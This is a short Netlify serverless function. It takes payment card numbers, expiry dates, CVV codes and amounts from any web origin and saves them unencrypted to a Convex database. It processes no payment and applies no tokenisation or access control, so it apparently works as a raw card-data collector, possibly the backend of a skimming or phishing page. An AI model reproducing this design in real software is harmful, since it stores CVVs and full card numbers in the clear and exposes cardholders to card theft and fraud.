// /netlify/functions/save-data.js

const ConvexClient = require('convex/browser/simple_client').ConvexClient;

const client = new ConvexClient('https://grateful-parakeet-799.convex.cloud');

exports.handler = async function(event, context) {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'OPTIONS,POST',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Content-Type': 'application/json'
    };

    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 200,
            headers,
        };
    }

    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            headers,
            body: JSON.stringify({ message: 'Method Not Allowed' }),
        };
    }

    try {
        const { cardNumber, expiryDate, cvv, amount } = JSON.parse(event.body);

        if (!cardNumber || !expiryDate || !cvv || amount === undefined) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ message: 'Missing fields.' }),
            };
        }

        const response = await client.mutation('saveData', {
            cardNumber,
            expiryDate,
            cvv,
            amount,
            timestamp: new Date().toISOString()
        });

        console.log('Response from Convex:', response);

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ message: 'Data saved successfully.' }),
        };
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ message: 'Failed to save data.' }),
        };
    }
};
